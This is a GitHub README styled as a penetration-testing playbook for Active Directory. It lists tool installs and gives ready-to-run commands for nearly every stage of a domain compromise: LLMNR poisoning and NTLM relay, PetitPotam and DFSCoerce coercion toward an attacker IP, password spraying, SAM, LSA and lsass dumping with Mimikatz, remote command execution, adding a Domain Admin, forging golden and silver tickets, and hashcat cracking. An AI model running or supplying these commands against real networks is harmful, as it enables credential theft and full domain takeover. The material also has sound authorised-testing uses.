://github.com/NotMedic/NetNTLMtoSilverTicket


# Gunnajs-Playbook
How to pentest like a Gunnaj

![alt text](https://github.com/GunzyPunzy/Gunnajs-Playbook/blob/main/anfader.jpg)

# Toolbox
<details>
  <summary> Utils </summary> 

  ### NMAP
  https://nmap.org/
  
  ### linWinPwn - Active Directory Vulnerability Scanner
  https://github.com/lefayjey/linWinPwn
  
  <details>
    <summary> Installation </summary>
    
  #### Install the dependency NetExec
    
  ```shell
  apt install pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  ```
    
  #### Git clone the repository and make the script executable
  ```shell
  git clone https://github.com/lefayjey/linWinPwn
  cd linWinPwn; chmod +x linWinPwn.sh
  ```
  #### Install requirements using the `install.sh` script (using standard account)
  ```shell
  chmod +x install.sh
  ./install.sh
  ```
  </details>
  
  ### BloodHound
  https://github.com/BloodHoundAD/BloodHound
  
  <details>
    <summary> Installation </summary> 
    
  ```shell
  apt-get install bloodhound
  ```
  ```shell
  neo4j console
  ```
  #### Navigate to http://localhost:7474/ 
  
  </details>
  
  ### Responder
  https://github.com/lgandx/Responder
  
  ### NetExec
  https://www.netexec.wiki/
  
  <details>
    <summary> Installation </summary> 
  
  #### Installation
  ```shell
  apt install pipx git
  pipx ensurepath
  pipx install git+https://github.com/Pennyw0rth/NetExec
  ```
  #### Integrate Bloodhound
  ```shell
  nano ~/.nxc/nxc.conf
  ```
  ```shell
  [BloodHound]
  bh_enabled = True
  bh_uri = 127.0.0.1
  bh_port = 7687
  bh_user = <username>
  bh_pass = <password>
  ```
  
  </details>
  
  ### Evil-WinRM
  https://github.com/Hackplayers/evil-winrm
  
  <details>
    <summary> Installation </summary>
    
  ```shell
  gem install evil-winrm
  ```
  </details>
  
  ### FindUncommonShares
  https://github.com/p0dalirius/FindUncommonShares
  
  <details>
    <summary> Installation </summary> 
    
  ```shell
  git clone https://github.com/p0dalirius/FindUncommonShares
  ```
  </details>
  
  ### lnkbomb
  https://github.com/dievus/lnkbomb
  <details>
    <summary> Installation </summary> 
  
  #### Clone this repo
  ```shell
  git clone https://github.com/dievus/lnkbomb
  ```
  #### Install prerequirements
  ```shell
  pip install -r requirements.txt
  ```
  </details>
  
  ### PetitPotam
  https://github.com/topotam/PetitPotam
  
  ### DFSCoerce
  https://github.com/Wh04m1001/DFSCoerce
  
  ### Impacket
  https://github.com/fortra/impacket
  
  ### pypykatz
  https://github.com/skelsec/pypykatz
  <details>
    <summary> Installation </summary> 
  
  #### Install prerequirements
  ```shell
  pip3 install minidump minikerberos aiowinreg msldap winacl
  ```
  #### Clone this repo
  ```shell
  git clone https://github.com/skelsec/pypykatz.git
  cd pypykatz
  ```
  #### Install it
  ```shell
  python3 setup.py install
  ```
  </details>

  ### certipty
  https://github.com/ly4k/Certipy
  
  ### breach-parse
  https://github.com/hmaverickadams/breach-parse
  
  ### PRET
  https://github.com/RUB-NDS/PRET
  <details>
    <summary> Installation </summary> 
    
  ```shell
  git clone https://github.com/RUB-NDS/PRET && cd PRET
  ```
  ```shell
  python -m pip install colorama pysnmP
  ```
  </details>

</details>

# Wordlists
<details>
  <summary> Lists </summary> 
  
  ### Generate wordlist
  https://zzzteph.github.io/weakpass/
  
  ### Top 10 million
  https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)
  
  ### Crackstation
  https://crackstation.net/files/crackstation.txt.gz (14.6 GB)
  
  ### Large p-list
  https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)
  
  ### Rockyou2021
  https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
</details>

# Network enumeration
<details>
  <summary> NMAP </summary> 
  
  ### Nmap
  #### Ping scan
  ```shell
  sudo nmap -sP -p -oN <output.txt> <IP/mask>
  ```

  #### Full scan
  ```shell
  sudo nmap -PN -sC -sV -p- -oN <output.txt> <IP/mask>
  ```

  #### smb vuln scan
  ```shell
  sudo nmap -PN --script smb-vuln* -p139,445 -oN <output.txt> <IP/mask>
  ```

  ### Find DC IP
  #### Show domain name and DNS
  ```shell
  sudo mncli dev show eth0
  ```

  #### Show DC IP
  ```shell
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<AD_domain>
  ```

  #### Show DC controllers in cmd
  ```shell
  nltest /dclist:<domainname>
  ```
</details>

# Acitve directory enumeration
<details>
  <summary> linWinPwn </summary> 
  
  ### Unauthenticated
  - Module ad_enum
      - RID bruteforce using crackmapexec
      - Anonymous enumeration using crackmapexec, enum4linux-ng, ldapdomaindump, ldeep
      - Pre2k authentication check on collected list of computers
  - Module kerberos
      - kerbrute user spray
      - ASREPRoast using collected list of users (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Blind Kerberoast
      - CVE-2022-33679 exploit
  - Module scan_shares
      - SMB shares anonymous enumeration on identified servers
  - Module vuln_checks
      - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on identified servers
      - Check for ms17-010, zerologon, petitpotam, nopac, smb-sigining, ntlmv1, runasppl weaknesses
  ```shell
   sudo ./linWinPwn.sh -t <Domain_Controller_IP_or_Target_Domain> -M user <output_dir>
  ```

  ### With AD-user credentials 
  - DNS extraction using adidnsdump
  - Module ad_enum
      - BloodHound data collection
      - Enumeration using crackmapexec, enum4linux-ng, ldapdomaindump, windapsearch, SilentHound, ldeep
          - Users
          - MachineAccountQuota
          - Password Policy
          - Users' descriptions containing "pass"
          - ADCS
          - Subnets
          - GPP Passwords
          - Check if ldap-signing is enforced, check for LDAP Relay
          - Delegation information
      - crackmapexec find accounts with user=pass 
      - Pre2k authentication check on domain computers
      - Extract ADCS information using certipy and certi.py

  - Module kerberos
      - kerbrute find accounts with user=pas
      - ASREPRoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
      - Targeted Kerberoasting (and cracking hashes using john-the-ripper and the rockyou wordlist)
  - Module scan_shares
      - SMB shares enumeration on all domain servers using smbmap and cme's spider_plus
      - KeePass files and processes discovery on all domain servers
  - Module vuln_checks
      - Enumeration for WebDav, dfscoerce, shadowcoerce and Spooler services on all domain servers
      - Check for ms17-010, ms14-068, zerologon, petitpotam, nopac, smb-signing, ntlmv1, runasppl weaknesses
  - Module mssql_enum
      - Check mssql privilege escalation paths
  ```shell
  sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
  ```
</details>

# MITM
<details>
  <summary> Responder </summary> 
  
  ### Kickstart responder
  ```shell
  responder -I eth0
  ```

  ### Force lm downgrade
  ```shell
  responder -I eth0 --lm
  ```
  
  ### DHCP poisining
  ```shell
  responder -I eth0 -d
  ```
 </details>
 <details>
  <summary> lnkbomb </summary> 
  
  ### Create a lnk file for a share with read/write rights
  ```shell
  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
  ```
   
  ### Remove the lnk file
  ```basb
  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r <file_name.url>
  ```
    
</details>
<details>
  <summary> Crackmapexec NTLM-relay </summary>   

  ### Evaluate no smb-signing and create an IP txt file for TLMRelayx
  ```shell
  crackmapexec smb <IPs> --gen-relay-list <outputIPs.txt>
  ```

  ### NTLMRelayx
  ```shell
  sudo python3 ntlmrelayx.py -of <dumofile.txt> -tf <outputIPs.txt> -smb2support
  ```

  ### Disbale SMB and HTTP in Responder.conf
  ```shell
  [Responder Core]

  ; Servers to start
  SQL = On
  SMB = Off
  RDP = On
  Kerberos = On
  FTP = On
  POP = On
  SMTP = On
  IMAP = On
  HTTP = Off
  HTTPS = On
  DNS = On
  LDAP = On
  DCERPC = On
  WINRM = On
  SNMP = Off
  ```

### Kicksart responder then
  ```shell
  sudo responder -I eth0 -dwv
  ```
</details>

<details>
  <summary> PetitPotam </summary> 
  
  ### Force NTLM authentication
  ```shell
  python3 PetitPotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
  ```
</details> 
  
<details>
  <summary> DFSCoerce </summary> 
  
  ### Force NTLM authentication
  ```shell
  python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
  ```
</details> 

# Password Spraying

<details>
  <summary> NetExec Password spray </summary> 
  
  ### Spray a password on a user list
  ```shell
  netexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
  ```

</details>

# Authentication
    
<details>
  <summary> NetExec domain authentication </summary> 
  
  ```shell
  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> 
  ```

</details> 
  
<details>
  <summary> NetExec local authentication </summary> 
  
  ```shell
  NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
  ```

</details> 

<details>
  <summary> NetExec rdp authentication </summary> 
  
  ```shell
  NetExec rdp <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
  ```

</details> 

# Share enumeration

<details>
  <summary> List readable or writable shares </summary> 

```shell
NetExec smb <target_IP> -u <username> -p <password>  --shares --filter-shares READ WRITE
```

</details>

<details>
  <summary> List uncommon shares </summary> 

```shell
./FindUncommonShares.py -u <username> -p <password> -d <AD_domain> --dc-ip <Domain_Controller_IP> --check-user-access
```

</details> 

<details>
  <summary> Mount and unmount shares </summary> 

### Mount share
```shell
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
```

### Unmount share
```shell
sudo umount <./folder>
```

### Search for keywords in files
```shell
grep -i <keyword> *
```

</details> 

# Credential dumping

<details>
  <summary> Domain authentication </summary> 

  ### Dump NT:hash with masky with domain user
  #### Get ADCS server name
  ```shell
  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -M adcs
  ```
  #### Retrieve the NT hash using PKINIT
  ```shell
  NetExec ldap <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M masky -o CA=<'ADCS_server_name'>
  ```
  
  ### Dump SAM with domain user
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> --sam
  ```
  
   ### Dump LSA with domain user
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash_NT]> --lsa
  ```
</details> 

<details>
  <summary> Local authentication </summary> 
  
  ### Dump SAM on local computer
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
  ```
  
  ### Dump LSA on local computer
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
  ```

  ### Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth -M hash_spider
  ```

  ### Stored User Names and Passwords on Windows Credential Manager
  ```shell
  rundll32.exe keymgr.dll KRShowKeyMgr
  ```
  
</details> 

<details>
  <summary> NetExec dump with ReadLAPSPassword rights </summary> 

  ### Check if the user can read LAPS
  ```shell
  NetExec ldap <AD_domain> -u <username> -p <password> -H <hash[LM:NT]> -M laps
  ```
  
  ### Dump SAM 
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -M laps --sam
  ```
  
  ### Dump LSA 
  ```shell
  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --M laps --lsa
  ```
  
</details> 

<details>
  <summary> Run Mimikatz from impackets smb share </summary> 

  ### Starting a SMB Server
  ```shell
  impacket-smbserver.py <shareName> <sharePath>
  ```
  
  ### Run Mimikatz from host and write output to the share
  ```shell
  \\<target_IP>\<shareName>\mimikatz.exe "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
  ```
  
</details> 

<details>
  <summary> linWinPwn </summary> 
  
### With administrator Account (using password, NTLM hash or Kerberos ticket)
- All of the "Standard User" checks
- Module pwd_dump
    - LAPS and gMSA dump
    - secretsdump on all domain servers
    - NTDS dump using impacket, crackmapexec and certsync
    - Dump lsass on all domain servers using: procdump, lsassy, nanodump, handlekatz, masky 
    - Extract backup keys using DonPAPI, HEKATOMB
```shell
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> -K <kerbticket[./krb5cc_ticket]> -o <output_dir>
```
</details> 

<details>
  <summary> Examine lsass dump with pypykatz </summary> 

```shell
pypykatz lsa minidump lsass.DMP
```
</details> 

# Remote Code Execution

<details>
  <summary> NetExec </summary> 
  
  ### Executes command via the follwoing protocols: 
  * `wmiexec` executes commands via WMI
  * `atexec` executes commands by scheduling a task with windows task scheduler
  * `smbexec` executes commands by creating and running a service
  
  #### command
  ```shell
  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]]> -x <command>
  ```
  #### PowerShell
  ```shell
  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash[LM:NT]> -X <command>
  ```
</details> 

<details>
  <summary> Evil-WinRM </summary> 
  
  ```shell
  evil-winrm -i <target_IP> -u <username> -p <password> -H <hash[LM:NT]>
  ```
</details> 

<details>
  <summary> Command to add a new Domain Admin </summary> 
  
  #### Create the new user
  ```Shell
  net user <username> <password> /add /domain
  ```

  #### Add the new user to the Domain Admins group
  ```Shell
  net group "Domain Admins" <username> /add /domain
  ```
</details> 

# AV Evasion

<details>
  <summary> NetExec </summary> 
  
  </details> 

</details> 
  
# golden and silver tickets

<details>
  <summary> Tickets </summary> 
  
#### Get user SID value by using the Windows Terminal
```cmd
wmic useraccount where name="USER" get sid
```

#### Silver ticket
```shell
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
```
#### Golden ticket
```shell
python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
```
#### Set the ticket for impacket use
```shell
export KRB5CCNAME=<TGS_ccache_file>
```

#### List tickets
```shell
klist
```

#### Execute remote commands with any of the following by using the TGT
```shell
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

</details>

# Printers
<details>
  <summary> PRET </summary> 

  ### Nmap printers
  ```shell
  nmap -p 9100 <IP/mask>
  ```
  ### cheat sheet
  ```shell
  http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
  ```
  ### Kickstart PRET 
  ```shell
  pret.py target {ps,pjl,pcl}
  ```
</details>

## Hash cracking
<details>
  <summary> Hashcat </summary> 
  
  ### LM
  ```shell
  hashcat64.exe -m 3000 -a 3 LM-hashes.txt -o cracked.txt
  ```

  ### NTLM
  ```shell
  hashcat64.exe -m 1000 -a 3 NTLM-hashes.txt -o cracked.txt
  ```

  ### NTLMv1
  ```shell
  hashcat64.exe -m 5500 -a 3 NTLMv1-hashes.txt -o cracked.txt
  ```

  ### NTLMv2
  ```shell
  hashcat64.exe -m 5600 -a 0 NTLMv2-hashes.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos ASREP
  ```shell
  hashcat64.exe -m 18200 -a 0 asrep-hashes.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS
  ```shell
  hashcat64.exe -m 13100 -a 0 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS AES128
  ```shell
  hashcat64.exe -m 19600 -a 0 krb5tgsaes128-hashes.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 TGS AES256
  ```shell
  hashcat64.exe -m 19700  -a 0 krb5tgsaes256.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 etype 17, Pre-Auth
  ```shell
  hashcat64.exe -m 19800  -a 0 krb5tetype17.txt <passlist.txt> -o cracked.txt
  ```

  ### Kerberos 5 etype 18, Pre-Auth
  ```shell
  hashcat64.exe -m 19900  -a 0 krb5tetype18.txt <passlist.txt> -o cracked.txt
  ```

  ### MsCache 2 (slow af)
  ```shell
  hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
  ```
</details>
